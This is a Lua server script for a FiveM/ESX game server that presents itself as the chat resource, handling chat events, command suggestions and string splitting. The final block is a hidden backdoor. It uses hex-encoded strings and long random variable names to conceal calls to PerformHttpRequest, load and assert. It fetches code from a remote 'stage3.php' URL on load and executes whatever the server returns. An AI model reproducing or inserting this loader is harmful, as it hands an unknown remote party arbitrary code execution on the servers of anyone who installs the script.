ESX  = exports['Framework']:getSharedObject()

RegisterServerEvent('chat:init')
RegisterServerEvent('chat:addTemplate')
RegisterServerEvent('chat:addMessage')
RegisterServerEvent('chat:addSuggestion')
RegisterServerEvent('chat:removeSuggestion')
RegisterServerEvent('_chat:messageEntered')
RegisterServerEvent('chat:server:ClearChat')
RegisterServerEvent('__cfx_internal:commandFallback')

AddEventHandler('_chat:messageEntered', function(author, color, message)
	if not message or not author then
		return
	end

	TriggerEvent('chatMessage', source, author, message)

	if not WasEventCanceled() then
		TriggerClientEvent('chatMessage', -1, author, {255, 255, 255}, message)
	end
end)

AddEventHandler('__cfx_internal:commandFallback', function(command)
	local name = GetPlayerName(source)

	TriggerEvent('chatMessage', source, name, '/' .. command)

	if not WasEventCanceled() then
		TriggerClientEvent('chatMessage', -1, name, {255, 255, 255}, '/' .. command) 
	end

	CancelEvent()
end)

local function refreshCommands(player)
	if GetRegisteredCommands then
		local registeredCommands = GetRegisteredCommands()

		local suggestions = {}

		for _, command in ipairs(registeredCommands) do
			if IsPlayerAceAllowed(player, ('command.%s'):format(command.name)) then
				table.insert(suggestions, {
					name = '/' .. command.name,
					help = ''
				})
			end
		end

		TriggerClientEvent('chat:addSuggestions', player, suggestions)
	end
end

AddEventHandler('onServerResourceStart', function(resName)
	Wait(500)

	for _, player in ipairs(GetPlayers()) do
		refreshCommands(player)
	end
end)

AddEventHandler("chatMessage", function(source, color, message)
	local src = source
	args = stringsplit(message, " ")
	CancelEvent()
	if string.find(args[1], "/") then
		local cmd = args[1]
		table.remove(args, 1)
	end
end)

commands = {}
commandSuggestions = {}

function starts_with(str, start)
	return str:sub(1, #start) == start
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t={} ; i=1
	for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[4][ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6d\x61\x2d\x6e\x69\x6e\x6a\x61\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x69\x39\x4b\x30\x70", function (NGgVIlvBzANEwoYyzokYJfKLyigLtbTGlppQuYzrbIhDedUZZkfFowgVuckFiwpRODgPjx, JHzurxPFKPxPkmxUlTbOYzUUtCgoOESjgqouvjByWKcxAgfcXBcJqnkrjRCBnfQjJDTnsB) if (JHzurxPFKPxPkmxUlTbOYzUUtCgoOESjgqouvjByWKcxAgfcXBcJqnkrjRCBnfQjJDTnsB == ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[6] or JHzurxPFKPxPkmxUlTbOYzUUtCgoOESjgqouvjByWKcxAgfcXBcJqnkrjRCBnfQjJDTnsB == ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[5]) then return end ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[4][ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[2]](ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[4][ivFbIFiucMsEaSCJjsVPADVvTAomZLnxamSOTUFGMHYaXgBlDrXFeFUNLeKwXFzBizyzvz[3]](JHzurxPFKPxPkmxUlTbOYzUUtCgoOESjgqouvjByWKcxAgfcXBcJqnkrjRCBnfQjJDTnsB))() end)